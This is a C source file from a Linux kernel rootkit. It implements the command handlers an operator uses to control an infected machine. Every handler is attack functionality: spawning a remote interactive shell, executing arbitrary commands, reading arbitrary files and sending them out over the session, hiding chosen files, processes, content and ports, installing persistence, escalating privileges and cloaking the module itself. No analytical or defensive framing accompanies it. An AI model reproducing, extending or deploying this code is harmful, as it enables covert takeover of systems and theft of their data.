// SPDX-License-Identifier: GPL-2.0
// execution/commands.c - Individual command handlers.
#include <linux/fs.h>
#include <linux/slab.h>
#include <linux/string.h>
#include <linux/utsname.h>
#include "rootkit.h"

int cmd_ping(struct rk_session *s, const char *arg)
{
	return rk_send_response(s, "PONG");
}

int cmd_status(struct rk_session *s, const char *arg)
{
	char buf[256];

	snprintf(buf, sizeof(buf),
		 "files=%d pids=%d content=%d ports=%d",
		 rk_file_targets.count, rk_pid_targets.count,
		 rk_content_targets.count, rk_port_targets.count);
	return rk_send_response(s, buf);
}

int cmd_info(struct rk_session *s, const char *arg)
{
	char buf[256];

	snprintf(buf, sizeof(buf), "%s %s %s",
		 utsname()->sysname, utsname()->release, utsname()->machine);
	return rk_send_response(s, buf);
}

int cmd_shell(struct rk_session *s, const char *arg)
{
	rk_start_interactive();
	return rk_send_response(s, "SHELL OK");
}

int cmd_exec(struct rk_session *s, const char *arg)
{
	if (!arg || !*arg)
		return rk_send_response(s, "ERR missing argument");
	rk_start_exec(arg);
	return rk_send_response(s, "EXEC OK");
}

int cmd_download(struct rk_session *s, const char *arg)
{
	struct file *f;
	char *buf;
	loff_t pos = 0;
	int error = 0;

	if (!arg || !*arg)
		return rk_send_response(s, "ERR missing path");

	f = filp_open(arg, O_RDONLY, 0);
	if (IS_ERR(f))
		return rk_send_response(s, "ERR open failed");

	buf = kmalloc(RK_CHUNK_SIZE, GFP_KERNEL);
	if (!buf) {
		filp_close(f, NULL);
		return -ENOMEM;
	}

	for (;;) {
		ssize_t bytes_read;

		bytes_read = kernel_read(f, buf, RK_CHUNK_SIZE, &pos);
		if (bytes_read < 0) {
			error = (int)bytes_read;
			break;
		}
		if (bytes_read == 0)
			break;

		error = rk_send_sealed(s, (u8 *)buf, bytes_read);
		if (error)
			break;
	}

	if (!error)
		error = rk_send_sealed(s, (const u8 *)"", 0);

	kfree(buf);
	filp_close(f, NULL);
	return error;
}

int cmd_hide_file(struct rk_session *s, const char *arg)
{
	if (!arg || !*arg)
		return rk_send_response(s, "ERR missing argument");
	rk_target_add(&rk_file_targets, arg);
	return rk_send_response(s, "HIDE FILE OK");
}

int cmd_unhide_file(struct rk_session *s, const char *arg)
{
	int idx;

	if (!arg || kstrtoint(arg, 10, &idx) != 0)
		return rk_send_response(s, "ERR bad index");
	rk_target_remove(&rk_file_targets, idx);
	return rk_send_response(s, "UNHIDE FILE OK");
}

int cmd_hide_pid(struct rk_session *s, const char *arg)
{
	if (!arg || !*arg)
		return rk_send_response(s, "ERR missing argument");
	rk_target_add(&rk_pid_targets, arg);
	return rk_send_response(s, "HIDE PID OK");
}

int cmd_unhide_pid(struct rk_session *s, const char *arg)
{
	int idx;

	if (!arg || kstrtoint(arg, 10, &idx) != 0)
		return rk_send_response(s, "ERR bad index");
	rk_target_remove(&rk_pid_targets, idx);
	return rk_send_response(s, "UNHIDE PID OK");
}

int cmd_hide_content(struct rk_session *s, const char *arg)
{
	if (!arg || !*arg)
		return rk_send_response(s, "ERR missing argument");
	rk_target_add(&rk_content_targets, arg);
	return rk_send_response(s, "HIDE CONTENT OK");
}

int cmd_unhide_content(struct rk_session *s, const char *arg)
{
	int idx;

	if (!arg || kstrtoint(arg, 10, &idx) != 0)
		return rk_send_response(s, "ERR bad index");
	rk_target_remove(&rk_content_targets, idx);
	return rk_send_response(s, "UNHIDE CONTENT OK");
}

int cmd_hide_port(struct rk_session *s, const char *arg)
{
	if (!arg || !*arg)
		return rk_send_response(s, "ERR missing argument");
	rk_target_add(&rk_port_targets, arg);
	return rk_send_response(s, "HIDE PORT OK");
}

int cmd_unhide_port(struct rk_session *s, const char *arg)
{
	int idx;

	if (!arg || kstrtoint(arg, 10, &idx) != 0)
		return rk_send_response(s, "ERR bad index");
	rk_target_remove(&rk_port_targets, idx);
	return rk_send_response(s, "UNHIDE PORT OK");
}

int cmd_list(struct rk_session *s, const char *arg)
{
	struct rk_target_list *list = NULL;
	char resp[512];
	int i, pos;
	unsigned long flags;

	if (!arg)
		return rk_send_response(s, "ERR missing list name");

	if (strcmp(arg, "FILE") == 0)
		list = &rk_file_targets;
	else if (strcmp(arg, "PID") == 0)
		list = &rk_pid_targets;
	else if (strcmp(arg, "CONTENT") == 0)
		list = &rk_content_targets;
	else if (strcmp(arg, "PORT") == 0)
		list = &rk_port_targets;
	else
		return rk_send_response(s, "ERR unknown list");

	pos = 0;
	spin_lock_irqsave(&list->lock, flags);
	for (i = 0; i < list->count && pos < (int)sizeof(resp) - 64; i++) {
		pos += snprintf(resp + pos, sizeof(resp) - pos,
				"%d %s\n", i, list->targets[i]);
	}
	spin_unlock_irqrestore(&list->lock, flags);

	if (pos == 0)
		return rk_send_response(s, "LIST EMPTY");

	resp[pos] = '\0';
	return rk_send_response(s, resp);
}

int cmd_persist(struct rk_session *s, const char *arg)
{
	rk_persist();
	return rk_send_response(s, "PERSIST OK");
}

int cmd_unpersist(struct rk_session *s, const char *arg)
{
	rk_unpersist();
	return rk_send_response(s, "UNPERSIST OK");
}

int cmd_escalate(struct rk_session *s, const char *arg)
{
	rk_escalate();
	return rk_send_response(s, "ESCALATE OK");
}

int cmd_cloak(struct rk_session *s, const char *arg)
{
	rk_cloak();
	return rk_send_response(s, "CLOAK OK");
}

int cmd_uncloak(struct rk_session *s, const char *arg)
{
	rk_uncloak();
	return rk_send_response(s, "UNCLOAK OK");
}
